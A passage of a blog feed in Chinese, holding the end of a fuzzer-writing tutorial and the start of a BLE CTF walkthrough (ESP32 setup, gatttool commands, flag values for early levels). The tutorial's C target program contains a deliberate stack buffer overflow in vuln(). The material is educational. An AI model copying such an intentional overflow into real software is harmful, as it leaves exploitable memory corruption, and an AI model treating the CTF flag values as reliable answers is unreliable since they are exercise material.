class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行测试,也成功得到了crash,但运行数次发现crash数量明显少于位翻转得到的</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/20241230104129.png" alt=""></p><p>至此,一个简陋非常的fuzzer的基本结构就已经完成了</p><h2 id="STEP-Ⅵ"><a href="#STEP-Ⅵ" class="headerlink" title="STEP Ⅵ"></a>STEP Ⅵ</h2><p>对结果可以进一步使用ASAN(AddressSanitizer)对crash进行分类处理</p><h1 id="Learn-Code-Coverage"><a href="#Learn-Code-Coverage" class="headerlink" title="Learn Code Coverage"></a>Learn Code Coverage</h1><p>现在fuzzer基本都支持代码覆盖率,这是一个非常amazing的东西,接下来使用ptrace模拟代码覆盖率</p><p>仓库地址<a href="https://github.com/h0mbre/Fuzzing/blob/master/Caveman4/">https://github.com/h0mbre/Fuzzing/blob/master/Caveman4/</a></p><h2 id="STEP-Ⅰ"><a href="#STEP-Ⅰ" class="headerlink" title="STEP Ⅰ"></a>STEP Ⅰ</h2><p>先看一下我们的目标程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ORIGINAL_FILE</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> * data;</span><br><span class="line">    <span class="type">size_t</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">struct</span> ORIGINAL_FILE <span class="title function_">get_bytes</span><span class="params">(<span class="type">char</span>* fileName)</span> &#123;</span><br><span class="line"> </span><br><span class="line">    FILE *filePtr;</span><br><span class="line">    <span class="type">char</span>* buffer;</span><br><span class="line">    <span class="type">long</span> fileLen;</span><br><span class="line"> </span><br><span class="line">    filePtr = fopen(fileName, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!filePtr) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Unable to open %s\n&quot;</span>, fileName);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (fseek(filePtr, <span class="number">0</span>, SEEK_END)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] fseek() failed, wtf?\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    fileLen = ftell(filePtr);</span><br><span class="line">    <span class="keyword">if</span> (fileLen == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] ftell() failed, wtf?\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    rewind(filePtr);</span><br><span class="line">    <span class="keyword">if</span> (errno) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] rewind() failed, wtf?\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="type">long</span> trueSize = fileLen * <span class="keyword">sizeof</span>(<span class="type">char</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] %s is %ld bytes.\n&quot;</span>, fileName, trueSize);</span><br><span class="line">    buffer = (<span class="type">char</span> *)<span class="built_in">malloc</span>(fileLen * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">    fread(buffer, fileLen, <span class="number">1</span>, filePtr);</span><br><span class="line">    fclose(filePtr);</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ORIGINAL_FILE</span> <span class="title">original_file</span>;</span></span><br><span class="line">    original_file.data = buffer;</span><br><span class="line">    original_file.length = trueSize;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> original_file;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">check_one</span><span class="params">(<span class="type">char</span>* buffer, <span class="type">int</span> check)</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (buffer[check] == <span class="string">&#x27;\x6c&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Check 1 failed.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">check_two</span><span class="params">(<span class="type">char</span>* buffer, <span class="type">int</span> check)</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (buffer[check] == <span class="string">&#x27;\x57&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Check 2 failed.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">check_three</span><span class="params">(<span class="type">char</span>* buffer, <span class="type">int</span> check)</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (buffer[check] == <span class="string">&#x27;\x21&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Check 3 failed.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span>* buffer, <span class="type">size_t</span> length)</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Passed all checks!\n&quot;</span>);</span><br><span class="line">    <span class="type">char</span> vulnBuff[<span class="number">20</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">memcpy</span>(vulnBuff, buffer, length);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span> || argc &gt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Usage: vuln example.txt\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *filename = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Analyzing file: %s.\n&quot;</span>, filename);</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ORIGINAL_FILE</span> <span class="title">original_file</span> =</span> get_bytes(filename);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> checkNum1 = (<span class="type">int</span>)(original_file.length * <span class="number">.33</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Check 1 no.: %d\n&quot;</span>, checkNum1);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> checkNum2 = (<span class="type">int</span>)(original_file.length * <span class="number">.5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Check 2 no.: %d\n&quot;</span>, checkNum2);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> checkNum3 = (<span class="type">int</span>)(original_file.length * <span class="number">.67</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Check 3 no.: %d\n&quot;</span>, checkNum3);</span><br><span class="line"> </span><br><span class="line">    check_one(original_file.data, checkNum1);</span><br><span class="line">    check_two(original_file.data, checkNum2);</span><br><span class="line">    check_three(original_file.data, checkNum3);</span><br><span class="line">     </span><br><span class="line">    vuln(original_file.data, original_file.length);</span><br><span class="line">     </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目标程序有三个检查点,分别检查1/3,1/2,2/3处的字节是否通过检查,当全部通过时便会直接触发段错误</p><p>利用之前的fuzzer,每次选择%1的字节进行完全随机变异,选中1/3处字节进行变异且刚好变异为我们所需要的字节的概率是1/25600,三次检查点都成功命中的概率可见是很低的,估计所需次数达到了万亿级别</p><p>所以我们需要在通过第一个检查后,保存当前状态,以此为基础作为下一次变异的基础,这样概率就能从指数级降低改为线性降低</p><h2 id="STEP-Ⅱ-1"><a href="#STEP-Ⅱ-1" class="headerlink" title="STEP Ⅱ"></a>STEP Ⅱ</h2><p>之前我们的fuzzer每一次启动都会使用大量的系统调用</p><p>其中fork()以及文件IO函数消耗极大却频繁出现,接下来我们考虑使用快照机制来减少这两种系统调用的出现,以提高性能,并实现我们的代码覆盖率</p><p>基本思路就是</p><ol><li>在文件读取文件后内容后设置一个断点,将此时的寄存器以及所有可写内存保存一份</li><li>在另一块内存将jpg文件数据复制,并对其变异</li><li>将变异后的数据写入目标内存替换原始数据,开始运行</li><li>如果遇到exit那么就恢复寄存器以及所有可写内存,重新回到第二步</li><li>如果遇到断点,那么就将当前变异后数据作为新的变异源数据,并再次开始</li></ol><h2 id="Persistent-Fuzz"><a href="#Persistent-Fuzz" class="headerlink" title="Persistent Fuzz"></a>Persistent Fuzz</h2><p>通过劫持共享库使从文件或从网络中读取数据变为从内存中读取</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;fuzzer应该是二进制安全学习者的必修项目,互联网上开源可供使用的fuzzer成百上千,专品精品应有尽有,但没什么比自己动手写一个fuzzer更好的学习方法了&lt;/p&gt;
&lt;p&gt;这里跟随国外的&lt;a href=&quot;https://h0mbre.github.io/&quot;&gt;h0mbre</summary>
      
    
    
    
    
    <category term="fuzzer" scheme="https://ixout.github.io/tags/fuzzer/"/>
    
  </entry>
  
  <entry>
    <title>blectf</title>
    <link href="https://ixout.github.io/posts/46033/"/>
    <id>https://ixout.github.io/posts/46033/</id>
    <published>2024-12-27T12:11:35.000Z</published>
    <updated>2025-04-04T12:13:58.319Z</updated>
    
    <content type="html"><![CDATA[<p>通过blectf简单认识与ble的交互</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p><strong>通用属性配置文件（GATT）</strong> 是 BLE（蓝牙低功耗）设备在建立连接后用于数据交换的协议框架。它定义了设备间如何通过一系列层次化的属性进行通信。GATT 结构中有三个核心概念：</p><ul><li><strong>Profile（配置文件）</strong></li><li><strong>Service（服务）</strong></li><li><strong>Characteristic（特征）</strong></li></ul><p>它们的关系可以类比为嵌套结构：</p><blockquote><p>一个 Profile 包含多个 Service<br>每个 Service 又包含一个或多个 Characteristic</p></blockquote><hr><p>在 BLE 的通信中，设备分为两类：</p><ul><li><strong>主机（Central/Master）</strong>：发起连接的一方</li><li><strong>从机（Peripheral/Slave）</strong>：被连接的一方，通常持有具体的数据和功能</li></ul><p>从机通常通过 Profile 来定义其提供的服务和功能。</p><hr><p>在 GATT 层中，通信角色被进一步细化为：</p><ul><li><strong>Server（服务端）</strong>：保存数据（如 Characteristic），响应客户端请求</li><li><strong>Client（客户端）</strong>：发起读取或写入请求，与服务端交互数据</li></ul><hr><h3 id="Characteristic（特征）的组成："><a href="#Characteristic（特征）的组成：" class="headerlink" title="Characteristic（特征）的组成："></a>Characteristic（特征）的组成：</h3><ul><li><strong>UUID</strong>：唯一标识</li><li><strong>Properties</strong>：定义行为（如读、写、通知）</li><li><strong>Value</strong>：当前值</li><li><strong>Descriptors</strong>：附加说明，如格式、权限等</li></ul><hr><h3 id="通信方式："><a href="#通信方式：" class="headerlink" title="通信方式："></a>通信方式：</h3><ul><li><strong>Client 向 Server 发送请求</strong>：读取（Read）或写入（Write）数据</li><li><strong>Server 主动推送数据给 Client</strong>：通过通知（Notify）</li></ul><hr><p>此外，还有一个更通用的术语 <strong>Attribute（属性）</strong>，用于描述 BLE 中的一切数据单元。它可以包含 UUID、属性、值、描述符等，是构成 Characteristic 的基础元素，也是 GATT 传输的核心单位。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-03_222927.png" alt=""></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>道具准备</p><ol><li>esp32开发板一片</li><li>USB蓝牙适配器一个, 我用的是绿联CM390(如果电脑自带的蓝牙适配器可以兼容linux可以不需要)</li></ol><p>环境安装</p><p>首先安装esptool用于烧录开发板</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install esptool</span><br></pre></td></tr></table></figure><p>接着克隆ble_ctf仓库并烧录</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/hackgnar/ble_ctf</span><br><span class="line"><span class="built_in">cd</span> ble_ctf</span><br><span class="line">esptool -p /dev/ttyUSB0 -b 460800 --before default_reset --after hard_reset --chip esp32  write_flash --flash_mode dio --flash_size 16MB --flash_freq 40m 0x1000 build/bootloader/bootloader.bin 0x8000 build/partition_table/partition-table.bin 0x10000 build/ble_ctf.bin</span><br></pre></td></tr></table></figure><p>flash_size可以根据自己的板子修改, 但不改问题也不大</p><p>等待烧录完成, 此时打开蓝牙可以扫描到一个BLECTF</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-04_145711.png" alt=""></p><h1 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h1><h2 id="gatttool"><a href="#gatttool" class="headerlink" title="gatttool"></a>gatttool</h2><p>命令行模式</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  gatttool [OPTION?]</span><br><span class="line"></span><br><span class="line">Help Options:</span><br><span class="line">  -h, --<span class="built_in">help</span>                                Show <span class="built_in">help</span> options</span><br><span class="line">  --help-all                                Show all <span class="built_in">help</span> options</span><br><span class="line">  --help-gatt                               Show all GATT commands</span><br><span class="line">  --help-params                             Show all Primary Services/Characteristics arguments</span><br><span class="line">  --help-char-read-write                    Show all Characteristics Value/Descriptor Read/Write arguments</span><br><span class="line"></span><br><span class="line">Application Options:</span><br><span class="line">  -i, --adapter=hciX                        Specify <span class="built_in">local</span> adapter interface</span><br><span class="line">  -b, --device=MAC                          Specify remote Bluetooth address</span><br><span class="line">  -t, --addr-type=[public | random]         Set LE address <span class="built_in">type</span>. Default: public</span><br><span class="line">  -m, --mtu=MTU                             Specify the MTU size</span><br><span class="line">  -p, --psm=PSM                             Specify the PSM <span class="keyword">for</span> GATT/ATT over BR/EDR</span><br><span class="line">  -l, --sec-level=[low | medium | high]     Set security level. Default: low</span><br><span class="line">  -I, --interactive                         Use interactive mode</span><br></pre></td></tr></table></figure><p>交互模式</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>                                           Show this <span class="built_in">help</span></span><br><span class="line"><span class="built_in">exit</span>                                           Exit interactive mode</span><br><span class="line">quit                                           Exit interactive mode</span><br><span class="line">connect         [address [address <span class="built_in">type</span>]]       Connect to a remote device</span><br><span class="line">disconnect                                     Disconnect from a remote device</span><br><span class="line">primary         [UUID]                         Primary Service Discovery</span><br><span class="line">included        [start hnd [end hnd]]          Find Included Services</span><br><span class="line">characteristics [start hnd [end hnd [UUID]]]   Characteristics Discovery</span><br><span class="line">char-desc       [start hnd] [end hnd]          Characteristics Descriptor Discovery</span><br><span class="line">char-read-hnd   &lt;handle&gt;                       Characteristics Value/Descriptor Read by handle</span><br><span class="line">char-read-uuid  &lt;UUID&gt; [start hnd] [end hnd]   Characteristics Value/Descriptor Read by UUID</span><br><span class="line">char-write-req  &lt;handle&gt; &lt;new value&gt;           Characteristic Value Write (Write Request)</span><br><span class="line">char-write-cmd  &lt;handle&gt; &lt;new value&gt;           Characteristic Value Write (No response)</span><br><span class="line">sec-level       [low | medium | high]          Set security level. Default: low</span><br><span class="line">mtu             &lt;value&gt;                        Exchange MTU <span class="keyword">for</span> GATT/ATT</span><br></pre></td></tr></table></figure><h2 id="bluetoothctl"><a href="#bluetoothctl" class="headerlink" title="bluetoothctl"></a>bluetoothctl</h2><p>虽然都说这个工具更好 但感觉使用体验上不如gatttool</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">enu main:</span><br><span class="line">Available commands:</span><br><span class="line">-------------------</span><br><span class="line">advertise                                         Advertise Options Submenu</span><br><span class="line">scan                                              Scan Options Submenu</span><br><span class="line">gatt                                              Generic Attribute Submenu</span><br><span class="line">list                                              List available controllers</span><br><span class="line">show [ctrl]                                       Controller information</span><br><span class="line">select &lt;ctrl&gt;                                     Select default controller</span><br><span class="line">devices                                           List available devices</span><br><span class="line">paired-devices                                    List paired devices</span><br><span class="line">system-alias &lt;name&gt;                               Set controller <span class="built_in">alias</span></span><br><span class="line">reset-alias                                       Reset controller <span class="built_in">alias</span></span><br><span class="line">power &lt;on/off&gt;                                    Set controller power</span><br><span class="line">pairable &lt;on/off&gt;                                 Set controller pairable mode</span><br><span class="line">discoverable &lt;on/off&gt;                             Set controller discoverable mode</span><br><span class="line">discoverable-timeout [value]                      Set discoverable <span class="built_in">timeout</span></span><br><span class="line">agent &lt;on/off/capability&gt;                         Enable/disable agent with given capability</span><br><span class="line">default-agent                                     Set agent as the default one</span><br><span class="line">advertise &lt;on/off/type&gt;                           Enable/disable advertising with given <span class="built_in">type</span></span><br><span class="line">set-alias &lt;<span class="built_in">alias</span>&gt;                                 Set device <span class="built_in">alias</span></span><br><span class="line">scan &lt;on/off&gt;                                     Scan <span class="keyword">for</span> devices</span><br><span class="line">info [dev]                                        Device information</span><br><span class="line">pair [dev]                                        Pair with device</span><br><span class="line">trust [dev]                                       Trust device</span><br><span class="line">untrust [dev]                                     Untrust device</span><br><span class="line">block [dev]                                       Block device</span><br><span class="line">unblock [dev]                                     Unblock device</span><br><span class="line">remove &lt;dev&gt;                                      Remove device</span><br><span class="line">connect &lt;dev&gt;                                     Connect device</span><br><span class="line">disconnect [dev]                                  Disconnect device</span><br><span class="line">menu &lt;name&gt;                                       Select submenu</span><br><span class="line">version                                           Display version</span><br><span class="line">quit                                              Quit program</span><br><span class="line"><span class="built_in">exit</span>                                              Quit program</span><br><span class="line"><span class="built_in">help</span>                                              Display <span class="built_in">help</span> about this program</span><br><span class="line"><span class="built_in">export</span>                                            Print environment variables</span><br></pre></td></tr></table></figure><h1 id="BLE-CTF"><a href="#BLE-CTF" class="headerlink" title="BLE_CTF"></a>BLE_CTF</h1><p>阅读Readme</p><p>查看分数</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b de:ad:be:ef:be:f1 --char-read -a 0x002a|awk -F<span class="string">&#x27;:&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="built_in">tr</span> -d <span class="string">&#x27; &#x27;</span>|xxd -r -p;<span class="built_in">printf</span> <span class="string">&#x27;\n&#x27;</span> </span><br></pre></td></tr></table></figure><p>提交flag</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b de:ad:be:ef:be:f1 --char-write-req -a 0x002c -n $(<span class="built_in">echo</span> -n <span class="string">&quot;some flag value&quot;</span>|xxd -ps)</span><br></pre></td></tr></table></figure><p>作者还给出了共20个关卡的知识点所在</p><div class="table-container"><table><thead><tr><th>Flag</th><th>Description</th></tr></thead><tbody><tr><td>Flag 1</td><td>This flag is a gift and can only be obtained from reading the hint!</td></tr><tr><td>Flag 0x002e</td><td>Learn how to read handles</td></tr><tr><td>Flag 0x0030</td><td>Read handle puzzle fun</td></tr><tr><td>Flag 0x0016</td><td>Learn about discoverable device attributes</td></tr><tr><td>Flag 0x0032</td><td>Learn about reading and writing to handles</td></tr><tr><td>Flag 0x0034</td><td>Learn about reading and writing ascii to handles</td></tr><tr><td>Flag 0x0036</td><td>Learn about reading and writing hex to handles</td></tr><tr><td>Flag 0x0038</td><td>Learn about reading and writing to handles differently</td></tr><tr><td>Flag 0x003c</td><td>Learn about write fuzzing</td></tr><tr><td>Flag 0x003e</td><td>Learn about read and write speeds</td></tr><tr><td>Flag 0x0040</td><td>Learn about single response notifications</td></tr><tr><td>Flag 0x0042</td><td>Learn about single response indicate</td></tr><tr><td>Flag 0x0046</td><td>Learn about multi response notifications</td></tr><tr><td>Flag 0x0048</td><td>Learn about multi response indicate</td></tr><tr><td>Flag 0x004c</td><td>Learn about BT client device attributes</td></tr><tr><td>Flag 0x004e</td><td>Learn about message sizes MTU</td></tr><tr><td>Flag 0x0050</td><td>Learn about write responses</td></tr><tr><td>Flag 0x0052</td><td>Hidden notify property</td></tr><tr><td>Flag 0x0054</td><td>Use multiple handle properties</td></tr><tr><td>Flag 0x0056</td><td>OSINT the author!</td></tr></tbody></table></div><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>flag1直接在readme中给我们了, 送分, 用于了解如何提交flag</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$gatttool</span> -b 14:2B:2F:C5:8A:56 --char-write-req -a 0x002c -n $(<span class="built_in">echo</span> -n <span class="string">&quot;12345678901234567890&quot;</span>|xxd -ps)</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line"><span class="variable">$gatttool</span> -b 14:2B:2F:C5:8A:56 --char-read -a 0x002a|awk -F<span class="string">&#x27;:&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="built_in">tr</span> -d <span class="string">&#x27; &#x27;</span>|xxd -r -p;<span class="built_in">printf</span> <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">Score:1 /20</span><br></pre></td></tr></table></figure><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p>Learn how to read handles</p><blockquote><p>Check out the ascii value of handle 0x002e and submit it to the flag submision handle 0x002c. If you are using gatttool, make sure you convert it to hex with xxd. If you are using bleah, you can send it as a string value.</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$gatttool</span> -b 14:2B:2F:C5:8A:56 --char-read -a 0x002e</span><br><span class="line">Characteristic value/descriptor: 64 32 30 35 33 30 33 65 30 39 39 63 65 66 66 34 34 38 33 35</span><br></pre></td></tr></table></figure><p>转为ascii也就是d205303e099ceff44835</p><p>提交</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 14:2B:2F:C5:8A:56 --char-write-req -a 0x002c -n $(<span class="built_in">echo</span> -n <span class="string">&quot;d205303e099ceff44835&quot;</span>|xxd -ps)</span><br></pre></td></tr></table></figure><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><p>Read handle puzzle fun</p><blockquote><p>Check out the ascii value of handle 0x0030. Do what it tells you and submit the flag you find to 0x002c.</p></blockquote><p>还是先读</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 14:2B:2F:C5:8A:56 --char-read -a 0x0030</span><br></pre></td></tr></table></figure><p>得到结果转字符串MD5 of Device Name</p><p>Device Name也就是BLECTF了</p><p>提交</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 14:2B:2F:C5:8A:56 --char-write-req -a 0x002c -n $(<span class="built_in">echo</span> -n <span class="string">&quot;5cd56d74049ae40f442e&quot;</span>|xxd -ps)</span><br></pre></td></tr></table></figure><h2 id="0x4"><a href="#0x4" class="headerlink" 